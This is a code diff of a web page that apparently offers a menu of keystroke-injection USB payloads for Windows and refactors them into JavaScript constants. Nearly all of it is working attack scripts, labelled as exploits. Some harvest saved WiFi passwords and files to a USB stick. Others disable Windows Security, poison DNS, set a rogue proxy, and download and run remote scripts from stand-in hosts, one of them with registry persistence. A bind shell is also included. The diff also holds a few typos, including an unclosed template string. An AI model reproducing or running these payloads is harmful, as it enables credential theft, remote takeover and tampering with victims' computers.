@@ -412,6 +412,106 @@ function topFunction() {
   document.documentElement.scrollTop = 0;
 }
 
+
+const wP = `GUI r
+DELAY 100
+STRING powershell -EP Bypass -NoP $f="$env:TEMP\\w.txt";netsh wlan show profiles|sls 'All User Profile'|%{($_ -split ': ')[-1].Trim()}|%{$n=$_;$k=netsh wlan show profile name="$n" key=clear|sls 'Key Content';"Profile: $n Password: "+($(if($k){$k -split ': '})[-1].Trim())}|Out-File $f -enc utf8;$l="pic0wn3d";0..9|%{if($v=gv|?{$_.FileSystemLabel -eq $l}){cp $f "$($v.DriveLetter):\\" -Force;exit};sleep 1}
+DELAY 300
+ENTER`;
+
+
+
+const yRR = `GUI r
+DELAY 50
+STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER
+DELAY 1500
+f`;
+
+const dwS = `CTRL ESC
+DELAY 500
+STRING windows security
+DELAY 500
+ENTER
+DELAY 1000
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 100
+SPACE
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+DELAY 500
+TAB
+DELAY 500
+SPACE
+DELAY 500
+TAB
+DELAY 500
+SPACE
+DELAY 100
+ALT F4`;
+
+const nRR = `GUI r
+DELAY 500
+STRING notepad
+DELAY 500
+ENTER
+DELAY 500
+GUI UPARROW
+DELAY 500
+STRING RICK ROLL NOTEPADZZZ
+
+const dnsP = `GUI r
+DELAY 100
+STRING powershell -W Hidden -EP Bypass -NoP Set-DnsClientServerAddress -InterfaceAlias 'Ethernet' -ServerAddresses ('1.3.3.7', '1.2.3.4')
+DELAY 100
+ENTER
+DELAY 100
+SSTRING powershell -W Hidden -EP Bypass -NoP Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi' -ServerAddresses ('1.3.3.7', '1.2.3.4')
+DELAY 100
+ENTER`;
+         
+const mitmP = `GUI r
+DELAY 100
+STRING powershell -W Hidden -EP Bypass -NoP Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ProxyServer '1.3.3.7:666'
+DELAY 100
+ENTER
+DELAY 200
+STRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ProxyEnable '1'
+DELAY 100
+ENTER`;
+         
+const rS = `GUI r
+DELAY 100
+STRING powershell -W Hidden -EP Bypass -NoP iex (New-Object Net.WebClient).DownloadString("http://lol.com/script.ps1")
+DELAY 100
+ENTER`;
+         
+const fC = `GUI r
+DELAY 100
+STRING powershell -W Hidden -EP Bypass -NoP $sf = "C:\\readme.txt"; $tdl = "pic0wn3d"; $a = 0; $ma = 10; while ($a -lt $ma) { $d = Get-Volume | Where-Object { $_.FileSystemLabel -eq $tdl }; if ($d) { $tp = "$($d.DriveLetter):\\ "; Copy-Item $sf -Destination $tp -Force; exit }; Start-Sleep -Seconds 1; $a++ }
+DELAY 300
+ENTER`;
+
+const bS = `GUI r
+DELAY 100
+STRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1");powercat -l -p 7777
+DELAY 300
+ENTER`;
+
+const prS = `GUI r
+DELAY 100
+STRING powershell -W Hidden -EP Bypass -NoP iex (New-Object Net.WebClient).DownloadString("http://lol.com/script.ps1");New-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersionRun\' -Name 'picowned' -Value 'powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString("http://lol.com/script.ps1")' -PropertyType 'String'
+DELAY 200
+ENTER`;         
+
+         
     </script>
 
         <main>
@@ -434,27 +534,26 @@ function topFunction() {
                  <linkblock>
                     <ul id="exploit_list">
                         <h3>Misc</h3>
-                    <a href="#" onclick="updateTextarea('CTRL ESC\nDELAY 500\nSTRING windows security\nDELAY 500\nENTER\nDELAY 1000\nENTER\nTAB\nTAB\nTAB\nTAB\nENTER\nDELAY 100\nSPACE\nDELAY 500\nLEFT\nDELAY 500\nENTER\nDELAY 500\nTAB\nDELAY 500\nSPACE\nDELAY 500\nTAB\nDELAY 500\nSPACE\nDELAY 100\nALT F4')"><li>Disable Windows Security</li></a>
-                    <a href="#" onclick="updateTextarea('GUI r\nDELAY 500\nSTRING notepad\nDELAY 500\nENTER\nDELAY 500\nGUI UPARROW\nDELAY 500\nSTRING RICK ROLL NOTEPADZZZ\nENTER')"><li>Notepad RickRoll</li></a>
-               <a href="#" onclick="updateTextarea('GUI r\nDELAY 50\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER\nDELAY 1500\nf')"><li>YouTube RickRoll</li></a>
+                    <a href="#" onclick="updateTextarea(dwS)"><li>Disable Windows Security</li></a>
+                    <a href="#" onclick="updateTextarea(nRR)"><li>Notepad RickRoll</li></a>
+                    <a href="#" onclick="updateTextarea(yRR)"><li>YouTube RickRoll</li></a>
                     </ul>
                 </linkblock>
                 <linkblock>
-          <ul id="exploit_list">
-        <h3>PowerShell</h3>
-                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-DnsClientServerAddress -InterfaceAlias \'Ethernet\' -ServerAddresses (\'1.3.3.7\', \'1.2.3.4\')\nDELAY 100\nENTER\nDELAY 100\nSSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-DnsClientServerAddress -InterfaceAlias \'Wi-Fi\' -ServerAddresses (\'1.3.3.7\', \'1.2.3.4\')\nDELAY 100\nENTER')"><li>DNS Poison</li></a>
-                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' -Name ProxyServer \'1.3.3.7:666\'\nDELAY 100\nENTER\nDELAY 200\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' -Name ProxyEnable \'1\'\nDELAY 100\nENTER\n')"><li>MITM Proxy</li></a>
-                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString(&quot;http://yu0rs3rv3r.com/yeahbuddy.ps1&quot;)\nDELAY 100\nENTER')"><li>Reverse Shell</li></a>
-                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString(&quot;http://yu0rs3rv3r.com/yeahbuddy.ps1&quot;);New-ItemProperty -Path \'HKCU:Software\\Microsoft\\Windows\\CurrentVersion\Run\\\' -Name \'picowned\' -Value \'powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString(&quot;http://yu0rs3rv3r.com/yeahbuddy.ps1&quot;)\' -PropertyType \'String\'\nDELAY 200\nENTER')"><li>Persistent Reverse Shell</li></a>
-                <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile IEX (New-Object System.Net.Webclient).DownloadString(&quot;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&quot;);powercat -l -p 7777\nDELAY 300\nENTER')"><li>Bind Shell</li></a>
-            </ul>
+                  <ul id="exploit_list">
+                    <h3>PowerShell</h3>
+                        <a href="#" onclick="updateTextarea(dnsP)"><li>DNS Poison</li></a>
+                        <a href="#" onclick="updateTextarea(mitmP)"><li>MITM Proxy</li></a>
+                        <a href="#" onclick="updateTextarea(rS)"><li>Reverse Shell</li></a>
+                        <a href="#" onclick="updateTextarea(prS)"><li>Persistent Reverse Shell</li></a>
+                        <a href="#" onclick="updateTextarea(bS)"><li>Bind Shell</li></a>
+                </ul>
             </linkblock>
             <linkblock>
                 <ul id="exploit_list">
                     <h3>File harvesters</h3>
-                 <a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W Hidden -EP Bypass -NoP $sf = &quot;C:\\readme.txt&quot;; $tdl = &quot;pic0wn3d&quot;; $a = 0; $ma = 10; while ($a -lt $ma) { $d = Get-Volume | Where-Object { $_.FileSystemLabel -eq $tdl }; if ($d) { $tp = &quot;$($d.DriveLetter):\\ &quot;; Copy-Item $sf -Destination $tp -Force; exit }; Start-Sleep -Seconds 1; $a++ }\nDELAY 300\nENTER')"><li>File Copy</li></a>
-<a href="#" onclick="updateTextarea('GUI r\nDELAY 100\nSTRING powershell -W Hidden -EP Bypass -NoP -c &quot;iwr http://server.com/wifikeys.ps1|iex&quot;\nDELAY 300\nENTER')"><li>WiFi keys</li></a>
-
+                        <a href="#" onclick="updateTextarea(fC)"><li>File Copy</li></a>
+                        <a href="#" onclick="updateTextarea(wP)"><li>WiFi keys</li></a>
                 </ul>
             </linkblock>
         </links>
